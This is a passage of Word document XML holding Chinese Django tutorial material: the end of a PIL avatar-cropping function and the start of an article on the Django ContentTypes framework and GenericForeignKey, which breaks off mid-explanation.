        </w:rPr>
        <w:t xml:space="preserve">    # </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>随机生成新的图片名，自定义路径。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430665D0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ext = file.name.split('.')[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344C37AA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    file_name = '{}.{}'.format(uuid.uuid4().hex[:10], ext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025EBD17" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    cropped_avatar = os.path.join(uid, "avatar", file_name)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E68DE2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>相对根目录路径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8D31D9" w14:textId="3595A879" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>file_path = os.path.join("media", uid, "avatar", file_name)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DFF9BD1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>裁剪图片</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>压缩尺寸为</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>200*200</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3F4AD7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>img = Image.open(file)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB4F2C5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    crop_im = img.crop((50,50,300, 300)).resize((200, 200), Image.ANTIALIAS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3AD607" w14:textId="7A193F13" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    crop_im.save(file_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16421322" w14:textId="0A4D1567" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return cropped_avatar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16449BE1" w14:textId="41B484C5" w:rsidR="001C47AF" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">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101</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId344" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django ContentTypes框架详解及使用场景介绍</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1905ED04" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django ContentTypes框架详解及使用场景介绍</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136274C5" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00D96E02" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId345" w:history="1">
        <w:r w:rsidR="00016AA9" w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00016AA9" w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-06-15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43265387" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django contenttypes是一个非常有用的框架，主要用来创建模型间的通用关系(generic relation)。不过由于其非常抽象，理解起来并不容易。当你创建一个django项目的时候，可以看到在默认的INSTALL_APPS已经包含了django.contrib.contenttypes。今天我们来重点讲下它的使用场景及如何使用django contenttypes。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305F3118" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>INSTALLED_APPS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EEB3165"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'django.contrib.admin',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FD2DB11"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'django.contrib.auth',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472AD9D1"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'django.contrib.contenttypes',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F2FB12"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'django.contrib.sessions',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7196BAB3"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'django.contrib.messages',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E856B13"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'django.contrib.staticfiles',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F699018" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC9BA8B" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本文参考了StackOverflow上著名问题及DjangoContentTypes详解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69062775" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>How exactly do Django content types work?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14153AB3" w14:textId="255C641F" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>https://blog.csdn.net/laughing2333/article/details/53014267</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7A2068" w14:textId="5B89B29A" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django ContentTypes框架使用场景</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B39E7AF" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>假设我们创建了如下模型，里面包含文章Post，Picture和评论Comment模型。Comment可以是对Post的评论，也可以是对Picture的评论。如果你还想对其它对象（比如回答，用户) 进行评论, 这样你将需要在comment对象里添加非常多的ForeignKey。你的直觉会告诉你，这样做很傻，会造成代码重复和字段浪费。一个更好的方式是，只有当你需要对某个对象或模型进行评论时，才创建comment与那个模型的关系。这时你就需要使用django contenttypes了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5779FD5D" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70ADC5A1" w14:textId="7B9BC3E9" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35C0C204" w14:textId="567C5A29" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your models here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EDFF636" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Post(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F53888"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author = models.ForeignKey(User)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8674C0"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title = models.CharField(max_length=75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4AF6F5" w14:textId="245B1D36" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    body = models.TextField(blank=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2339BE32" w14:textId="0240C825" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Picture(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794252D6"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author = models.ForeignKey(User)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0070D14F"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image = models.ImageField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29550B48" w14:textId="40CD7054" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    caption = models.TextField(blank=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9E8FED" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Comment(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64043C38"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author = models.ForeignKey(User)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11870CA9"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body = models.TextField(blank=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FD5A7B"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post = models.ForeignKey(Post, null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0684E52C"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picture = models.ForeignKey(Picture, null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33587D36" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django ContentType提供了一种GenericForeignKey的类型，通过这种类型可以指定content_object。修改过的comment模型如下图所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4650F5FB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.contenttypes.fields import GenericForeignKey</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9C53F0" w14:textId="6210FD2C" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.contenttypes.models import ContentType</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C84B3E" w14:textId="61CB4ED6" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Comment(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FB866D" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  author = models.ForeignKey(User)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3660FBEF" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  body = models.TextField(blank=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41ADCEE0" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  content_type = models.ForeignKey(ContentType)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E6330D" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  object_id = models.PositiveIntegerField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71416518" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  content_object = GenericForeignKey()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D02EB8" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>comment里加了3个字段:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719D4359" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
